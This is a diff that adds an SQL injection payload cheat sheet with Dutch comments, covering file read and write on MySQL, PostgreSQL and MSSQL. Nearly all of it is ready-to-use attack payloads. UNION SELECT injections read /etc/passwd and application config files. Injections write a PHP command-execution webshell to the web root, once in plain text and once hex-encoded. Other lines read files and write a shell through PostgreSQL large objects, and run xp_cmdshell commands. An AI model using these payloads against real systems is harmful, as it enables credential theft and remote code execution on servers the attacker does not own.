@@ -1,0 +1,23 @@
+# SQL Injection - File Read/Write
+# === MySQL File Lezen ===
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
+' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -
+# Vereist: FILE privilege + secure_file_priv niet restrictief
+# === MySQL File Schrijven (webshell) ===
+' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
+' UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
+# Vereist: FILE privilege + schrijfrechten op pad
+# === PostgreSQL File Lezen ===
+' UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -
+# Via COPY:
+COPY (SELECT '') TO '/tmp/test.txt';
+# === PostgreSQL Large Objects (binary bestanden) ===
+SELECT lo_import('/etc/passwd', 1337);
+SELECT lo_get(1337);
+# File schrijven via Large Objects:
+SELECT lo_from_bytea(0, decode('base64data', 'base64'));
+SELECT lo_export(0, '/var/www/html/shell.php');
+# === MSSQL File Lezen ===
+' UNION SELECT 1,2,3,4; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'-- -
+# Tip: MySQL secure_file_priv check: SHOW VARIABLES LIKE 'secure_file_priv'
+# Tip: PostgreSQL: pg_read_file werkt alleen in data directory tenzij superuser
